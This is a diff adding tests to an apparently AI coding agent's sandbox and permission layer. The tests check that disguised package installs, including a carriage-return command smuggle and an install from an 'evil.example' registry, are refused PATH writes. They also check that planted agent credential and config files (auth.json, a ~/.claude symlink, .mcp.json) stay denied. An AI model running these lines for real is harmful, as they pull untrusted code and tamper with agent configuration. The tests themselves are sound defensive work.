@@ -391,3 +391,51 @@ test("PATH writes are refused for installs from a local path, URL or git spec", 
   assert.equal(needsPathWrite("npm i -g @scope/pkg"), true);
   assert.equal(needsPathWrite("go install example.com/x/t@latest"), true);
 });
+
+test("PATH writes are refused for every spelling that hides a local or remote package", () => {
+  for (const line of [
+    `npm i -g "./e"`, `npm i -g './e'`, `npm i -g $'./e'`, "npm i -g foo@file:../x", "npm i -g foo@github:u/r", "npm i -g foo@git+https://x/y",
+    "npm i -g foo@http://x/y.tgz", "npm i -g foo@link:../x", "npm i -g foo@workspace:*", "npm i -g foo@https", "npm i -g ./*", "npm i -g .?/e",
+    "npm i -g {a,b}", "npm i -g [a]", "npm i -g ~/e", "npm i -g ~root/e", "npm i -g a\\ b", "npm i -g e\rtouch", "npm i -g .e", "npm i -g /e",
+    "npm i -g e.tgz", "npm i -g --registry=http://evil.example x", "cargo install --git=https://x/y z", "cargo install --path=. z",
+    "brew install --formula ./x", "brew install homebrew/core/../x", "go install ./...", "go install ./cmd/*", "pipx install 'x'", "pip install -g x",
+  ]) assert.equal(needsPathWrite(line), false, line);
+  for (const line of ["npm i -g left-pad@1.3.0", "npm i -g @scope/pkg@^2", "npm i -g typescript@latest", "brew install homebrew/core/jq", "cargo install --version 1.2.3 ripgrep", "pnpm add --global zod"]) {
+    assert.equal(needsPathWrite(line), true, line);
+  }
+});
+
+test("Full access may create a tool's config folder under the home, Auto's confined line may not, planted files stay denied", { skip: !darwin }, () => {
+  const dir = realpathSync(mkdtempSync(join(tmpdir(), "ub-fullhome-")));
+  const previousHome = process.env.HOME;
+  process.env.HOME = join(dir, "home");
+  try {
+    mkdirSync(join(dir, "home", ".config"), { recursive: true });
+    mkdirSync(join(dir, "proj"), { recursive: true });
+    const full = sandboxProfile(join(dir, "proj"), "folder", true);
+    const auto = sandboxProfile(join(dir, "proj"), "folder", false);
+    assert.equal(full.includes(`(regex #"^${join(dir, "home")}/\\.codex$")`), false);
+    assert.ok(auto.includes(`(regex #"^${join(dir, "home")}/\\.codex$")`));
+    runProfile(full, join(dir, "proj"), `mkdir "${dir}/home/.codex" "${dir}/home/.gemini" "${dir}/home/.config/gh"; echo x > "${dir}/home/.codex/config.toml"; echo y > "${dir}/home/.codex/auth.json"; ln -s stage "${dir}/home/.claude"`);
+    assert.equal(existsSync(join(dir, "home", ".codex")), true);
+    assert.equal(existsSync(join(dir, "home", ".gemini")), true);
+    assert.equal(existsSync(join(dir, "home", ".config", "gh")), true);
+    assert.equal(existsSync(join(dir, "home", ".codex", "config.toml")), false, "planted file inside stays denied");
+    assert.equal(existsSync(join(dir, "home", ".claude")), false, "symlink to a config folder name stays denied");
+  } finally {
+    if (previousHome === undefined) delete process.env.HOME;
+    else process.env.HOME = previousHome;
+  }
+});
+
+test("a confined (no card) refusal also comes back with the hint", { skip: !darwin }, async () => {
+  const box = grantFixture("auto");
+  try {
+    const done = await bash.execute({ command: "echo x > .mcp.json" } as never, { session: { id: "sess-1" } } as never) as { exitCode: number; hint?: string; status?: string };
+    assert.equal(box.approvals.listPending().length, 0, "the line ran without a card");
+    assert.notEqual(done.exitCode, 0);
+    assert.match(done.hint ?? "", /refused path/);
+  } finally {
+    box.restore();
+  }
+});
